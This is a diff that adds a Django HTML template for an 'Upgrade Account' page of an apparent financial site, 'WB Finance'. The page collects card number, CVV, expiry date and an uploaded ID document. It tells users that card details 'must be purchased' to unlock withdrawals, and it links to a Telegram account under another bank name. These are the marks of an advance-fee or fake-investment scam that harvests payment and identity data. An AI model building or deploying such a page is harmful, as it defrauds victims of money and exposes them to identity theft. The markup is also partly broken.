@@ -1,0 +1,250 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="{% static 'img/favicon.ico' %}" rel="icon">
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=Rubik:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
+    
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <title>Upgrade Account</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #0061a8, #06A3DA);
+            font-family: 'Nunito', sans-serif;
+        }
+        .navbar {
+            background-color: #004080;
+        }
+        .navbar-brand {
+            font-weight: 700;
+        }
+        .upgrade-container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+        .upgrade-container h2 {
+            color: #004080;
+            font-weight: 700;
+        }
+        .form-group label {
+            font-weight: 600;
+        }
+        .form-group input, .form-group select {
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        .submit-btn {
+            background-color: #004080;
+            color: #fff;
+            font-weight: 600;
+            border-radius: 5px;
+            padding: 10px 20px;
+            border: none;
+        }
+        .submit-btn:hover {
+            background-color: #002952;
+        }
+        .success-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            display: none;
+            padding: 20px;
+            text-align: center;
+        }
+        .success-popup.show {
+            display: block;
+        }
+        .popup-content h2 {
+            font-weight: 700;
+            color: #004080;
+        }
+        .close-popup {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #444;
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+        .info-note {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #f5c6cb;
+        }
+        .telegram-icon {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 60px;
+            height: 60px;
+            background-color: #0088cc;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            cursor: pointer;
+            animation: bounce 2s infinite;
+            transition: transform 0.3s;
+        }
+
+        .telegram-icon:hover {
+            transform: scale(1.1);
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        .telegram-icon img {
+            width: 35px;
+            height: 35px;
+        }
+    </style>
+</head>
+<body>
+    <div class="telegram-icon" id="telegramBtn">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram">
+    </div>
+
+    <nav class="navbar navbar-expand-md navbar-dark">
+        <div class="container">
+            <a href="/" class="navbar-brand">WB Finance</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#main-nav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse justify-content-end" id="main-nav">
+                <ul class="navbar-nav">
+                    <li class="nav-item"><a class="nav-link" href="{% url 'setting' %}">Profile</a></li>
+                    <li class="nav-item"><a class="nav-link" href="{% url 'reset_profile' %}">Settings</a></li>
+                    <li class="nav-item"><a class="nav-link" href="{% url 'logout' %}">Logout</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <div class="upgrade-container">
+        <h2>Upgrade Your Account</h2>
+        <p>Please provide your credentials to complete the upgrade process.</p>
+        
+        <!-- Info Note -->
+        <div class="info-note">
+            <p><strong>Important:</strong> The card details must be purchased in order to upgrade your account and unlock withdrawal features.</p>
+        </div>
+
+        <!-- Error or Success Messages -->
+        {% if messages %}
+            <div class="alert alert-danger" role="alert">
+                {% for message in messages %}
+                    <p>{{ message }}</p>
+                {% endfor %}
+            </div>
+        {% endif %}
+
+        <form id="upgradeForm" action="{% url 'Upgrade_Account' %}" method="post" enctype="multipart/form-data">
+            {% csrf_token %}
+            
+            <!-- Mobile Bank Card Number -->
+            <div class="form-group mb-3">
+                <label for="card-number">Mobile Bank Card Number:</label>
+                <input type="text" id="card-number" name="card_number" class="form-control" required>
+            </div>
+            
+            <!-- CVV -->
+            <div class="form-group mb-3">
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" class="form-control" required>
+            </div>
+            
+<!-- Expiration Date (Month and Year) -->
+<div class="form-group mb-3">
+    <label for="expiry-month">Expiration Date:</label>
+    <div class="d-flex gap-2">
+        <select id="expiry-month" name="expiry_month" class="form-select" required>
+            <option value="" disabled selected>Month</option>
+            {% for month in months %}
+                <option value="{{ month }}">{{ month }}</option>
+            {% endfor %}
+        </select>
+        <select id="expiry-year" name="expiry_year" class="form-select" required>
+            <option value="" disabled selected>Year</option>
+            {% for year in years %}
+                <option value="{{ year }}">{{ year }}</option>
+            {% endfor %}
+        </select>
+    </div>
+</div>
+
+<!-- Hidden field for the combined expiry date -->
+<input type="hidden" id="expiry_date" name="expiry_date" required>
+
+            
+            <!-- Document Type -->
+            <div class="form-group mb-3">
+                <label for="document-type">Document Type:</label>
+                <select id="document-type" name="document_type" class="form-select" required>
+                    <option value="" disabled selected>Select document type</option>
+                    <option value="driver_license">Driver License</option>
+                    <option value="electric_bill">Electric Bill</option>
+                    <option value="bank_document">Bank Document</option>
+                </select>
+            </div>
+            
+            <!-- Document Upload -->
+            <div class="form-group mb-3">
+                <label for="document-upload">Upload Document:</label>
+                <input type="file" id="document-upload" name="document_upload" class="form-control" accept=".pdf,.jpg,.jpeg,.png" required>
+            </div>
+            
+            <!-- Submit Button -->
+            <button type="submit" class="submit-btn w-100">Submit</button>
+        </form>
+        
+    </div>
+<script>
+    document.querySelector('form').addEventListener('submit', function(event) {
+    var expiryMonth = document.getElementById('expiry-month').value;
+    var expiryYear = document.getElementById('expiry-year').value;
+
+    if (expiryMonth && expiryYear) {
+        // Combine the month and year in MM/YYYY format
+        document.getElementById('expiry_date').value = expiryMonth + '/' + expiryYear;
+    } else {
+        // If the month or year is not selected, prevent form submission
+        event.preventDefault();
+        alert("Please select both month and year for expiration date.");
+    }
+});
+document.getElementById("telegramBtn").addEventListener("click", function() {
+            window.open("https://t.me/CRESTLINE_BANK", "_blank");
+        });
+</script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+  </html>
+              
